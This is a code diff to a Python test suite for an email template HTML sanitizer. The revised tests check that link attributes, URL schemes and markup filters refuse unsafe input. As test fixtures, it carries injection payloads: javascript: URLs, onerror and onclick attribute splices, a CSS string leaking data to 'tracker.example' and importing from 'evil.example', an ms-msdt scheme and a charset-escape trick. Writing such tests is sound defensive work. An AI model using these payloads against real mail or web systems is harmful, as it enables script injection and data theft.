@@ -61,7 +61,6 @@ from angee.messaging_templates.html_checks import (
     LINK_ATTRIBUTES,
     MAIL_ATTRIBUTES,
     MAIL_ELEMENTS,
-    OUTPUT_ATTRIBUTES,
     VOID_ELEMENTS,
     SpellingRule,
     check_html,
@@ -767,7 +766,8 @@ def test_a_mail_is_written_with_its_own_elements_and_attributes() -> None:
     values = {"href": "https://example.test/", "src": "https://example.test/a.png", "background": "#",
               "cite": "https://example.test/", "charset": "utf-8"}
     for name in sorted(MAIL_ATTRIBUTES):
-        assert check_html(f'<p {name}="{values.get(name, "x")}">x</p>', expression) == [], name
+        tag = sorted(LINK_ATTRIBUTES[name])[0] if name in LINK_ATTRIBUTES else "p"
+        assert check_html(f'<{tag} {name}="{values.get(name, "x")}">x</{tag}>', expression) == [], name
     for name in ("onclick", "onerror", "http-equiv", "srcset", "srcdoc", "formaction", "ping", "longdesc", "data",
                  "data-x", "poster", "action", "popover", "xlink:href", "usemap", "is"):
         refusals = check_html(f'<p {name}="x">x</p>', expression)
@@ -913,10 +913,13 @@ def test_link_attributes_follow_url_and_text_attributes_are_text() -> None:
     """URL-valued attributes: the ones mail links with follow url; the others are refused by name; text is text."""
 
     expression = compiled_expression(HTML_ENGINE)
-    for name in sorted(LINK_ATTRIBUTES):
+    for name, elements in LINK_ATTRIBUTES.items():
+        tag = sorted(elements)[0]
         for value in ("javascript:alert(1)", "JaVaScRiPt:x", "java&#9;script:x", "data:text/html,x"):
-            assert check_html(f'<td {name}="{value}">x</td>', expression), (name, value)
-        assert check_html(f'<td {name}="https://example.test/a.png">x</td>', expression) == [], name
+            assert check_html(f'<{tag} {name}="{value}">x</{tag}>', expression), (name, value)
+        assert check_html(f'<{tag} {name}="https://example.test/a.png">x</{tag}>', expression) == [], name
+        assert check_html(f'<p {name}="https://example.test/">x</p>', expression) == [
+            f"the {name} attribute links on <{'>, <'.join(sorted(elements))}> alone"], name
     for name in ("ping", "longdesc", "lowsrc", "dynsrc", "usemap", "data", "codebase", "archive", "manifest",
                  "profile", "formaction", "srcset", "icon", "xlink:href", "poster", "action"):
         assert any(f"the {name} attribute is not one a mail" in refusal for refusal in check_html(
@@ -1113,18 +1116,19 @@ def _reading(html: str, *, scripting: bool) -> tuple[list[tuple[Any, ...]], list
     The elements in document order with their attributes, and the comments; then the text of every ``style`` and
     ``script`` element. ``scripting`` reads ``noscript`` as a browser with scripting on or off does. Independent of
     the ``html.parser`` the HTML checks are built on, so a difference between the two is what it finds. The whole
-    document is read, what lies before and after its ``html`` element too.
+    document is read, what lies before and after its ``html`` element too, and from its bytes in the character set
+    it declares, as a browser reads a mail sent without one.
     """
 
     root = html5lib.HTMLParser(
         tree=html5lib.getTreeBuilder("etree", fullTree=True), namespaceHTMLElements=False,
-    ).parse(html, scripting=scripting)
+    ).parse(html.encode(), scripting=scripting, likely_encoding="utf-8", useChardet=False)
     markup: list[tuple[Any, ...]] = []
     raw: list[str] = []
     for element in root.iter():
         if not isinstance(element.tag, str):
             markup.append(("comment", element.text))
-        elif element.tag != "br":  # linebreaksbr writes <br> after escaping, as it may
+        elif element.tag != "br" or element.attrib:  # linebreaksbr writes a bare <br> after escaping, as it may
             markup.append(("start", element.tag, tuple(element.attrib.items())))
             if element.tag in ("style", "script"):
                 raw.append(element.text or "")
@@ -1171,12 +1175,11 @@ def _assert_value_stays_text(
                 continue
             assert [name for name, _ in after[2]] == [name for name, _ in before[2]], (before, after)
             for (name, was), (_, now) in zip(before[2], after[2], strict=True):
-                if name in LINK_ATTRIBUTES and now != was:
+                linking = (before[1], name) in LINKED
+                if linking and now != was:
                     # Judged apart from url itself: an absolute link of the four schemes, or none.
                     assert now == "" or now.lower().startswith(SENT_SCHEMES), (before[1], name, now)
-                if name in OUTPUT_ATTRIBUTES or (
-                    name in LINK_ATTRIBUTES and (was, now) == (url(_harmless(value)), url(value))
-                ):
+                if name in TEXT_ATTRIBUTES or (linking and (was, now) == (url(_harmless(value)), url(value))):
                     continue
                 assert now == was, (before[1], name, was, now)
 
@@ -1196,6 +1199,14 @@ class _Rows:
 
 
 SENT_SCHEMES = ("https://", "http://", "mailto:", "tel:")
+LINKED = frozenset({
+    ("a", "href"), ("img", "src"), ("body", "background"), ("table", "background"), ("td", "background"),
+    ("th", "background"), ("blockquote", "cite"),
+})
+"""The element and attribute pairs where a value's url output may differ from a harmless one's: the oracle's own,
+apart from the code it judges, so a link element the checks admitted by mistake fails it."""
+TEXT_ATTRIBUTES = frozenset({"alt", "title", "aria-label"})
+"""The attributes where a value's text may differ: the oracle's own, so a value setting dir or lang fails it."""
 SPLICE = "y style=color:red onclick=alert(1)"
 JAVASCRIPT = "javascript:alert(document.domain)"
 CSS = "}*{background:url(https://tracker.example/leak?)}@import url(https://evil.example/x.css);"
@@ -1258,11 +1269,17 @@ FAMILIES: list[tuple[dict[str, str], str]] = [
     ({"before": "<p>{{ v|linebreaksbr|truncatechars:3 }} {{ v }}</p>"}, "\n" + SPLICE),
     ({"before": '<a href="{{ v|url }}">x</a>'}, "ms-msdt:/id PCWDiagnostic"),
     ({"head": '<meta charset="iso-2022-jp">', "before": '<p title="{{ v }}">x</p>'}, '\x1b$B"><b onclick=x>'),
+    ({"before": '<a href="{{ v }}">Open</a>'}, JAVASCRIPT),
+    ({"before": "<p><{{ v }}</p>"}, "img src=x onerror=alert(document.domain) "),
+    ({"before": '<link rel="stylesheet" href="{{ v|url }}"><p>Hi</p>'}, "https://evil.example/steal.css"),
+    ({"before": "<p>{{ v|linebreaksbr }}</p>"}, "a\n<img src=x onerror=alert(document.domain)>"),
+    ({"before": '<p dir="{{ v }}" lang="{{ v }}">x</p>'}, "rtl"),
 ]
 """Each family the closed lists refuse, as the row parts it takes and the value that shows what it would break: an
 element off the list holding a value, an unquoted or single-quoted output, a NUL forging a placeholder, a < in a
 title, a self-closing or unclosed style, a row ending inside a tag, a markup filter cut, a scheme off the list, a
-character set other than UTF-8."""
+character set other than UTF-8, a bare output in a link, a < before an output in text, a link element, a markup
+filter's input, a value in dir or lang."""
 
 _REFUSED = st.sampled_from([
     # Rule 7: elements off the list, each holding a value where a reader would not read text.
